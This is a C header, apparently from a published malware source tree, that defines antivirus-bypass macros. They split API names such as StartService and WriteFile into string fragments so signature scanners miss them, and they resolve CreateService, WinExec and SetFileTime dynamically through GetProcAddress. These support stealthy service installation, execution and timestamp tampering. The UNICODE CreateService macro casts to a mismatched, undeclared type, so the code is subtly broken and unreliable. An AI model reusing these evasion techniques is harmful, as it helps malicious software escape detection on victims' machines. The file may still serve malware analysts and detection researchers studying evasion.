// Copyright 2015 Christian Roggia. All rights reserved.
// Use of this source code is governed by an Apache 2.0 license that can be
// found in the LICENSE file.

#ifndef __INC_BYPASS_HPP__
#define __INC_BYPASS_HPP__

typedef BOOL (WINAPI *__tWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *__tStartService)(SC_HANDLE, DWORD, LPCTSTR);

#ifndef UNICODE
#define AV_BYPASS__StartService(p) \
{ \
	sprintf(p, "Sta"); \
	strcat(p, "rtServiceA"); \
}
#else // !UNICODE
#define AV_BYPASS__StartService(p) \
{ \
	sprintf(p, "Sta"); \
	strcat(p, "rtServiceW"); \
}
#endif // !UNICODE

typedef SC_HANDLE (WINAPI *__tCreateService)(SC_HANDLE, LPCTSTR, LPCTSTR, DWORD, DWORD, DWORD, DWORD, LPCTSTR, LPCTSTR, LPDWORD, LPCTSTR, LPCTSTR, LPCTSTR);
#ifndef UNICODE
#define AV_BYPASS__CreateService(p) \
{ \
	(p) = (__tCreateService)GetProcAddress( \
		GetModuleHandle("advapi32.dll"), \
		"CreateServiceA" \
	); \
}
#else // !UNICODE
#define AV_BYPASS__CreateService(p) \
{ \
	(p) = (__tGetNativeSystemInfo)GetProcAddress( \
		GetModuleHandle("advapi32.dll"), \
		"CreateServiceW" \
	); \
}
#endif // !UNICODE

typedef UINT (WINAPI *__tWinExec)(LPCSTR, UINT);
#define AV_BYPASS__WinExec(p) \
{ \
	(p) = (__tWinExec)GetProcAddress( \
		GetModuleHandle("kernel32.dll"), \
		"WinExec" \
	); \
}

typedef BOOL (WINAPI *__tSetFileTime)(HANDLE, const FILETIME *, const FILETIME *, const FILETIME *);
#define AV_BYPASS__SetFileTime(p) \
{ \
	(p) = (__tSetFileTime)GetProcAddress( \
		GetModuleHandle("kernel32.dll"), \
		"SetFileTime" \
	); \
}

#define AV_BYPASS__WriteFile(p) \
{ \
	sprintf(p, "Write"); \
	strcat(p, "File"); \
}

#endif // __INC_BYPASS_HPP__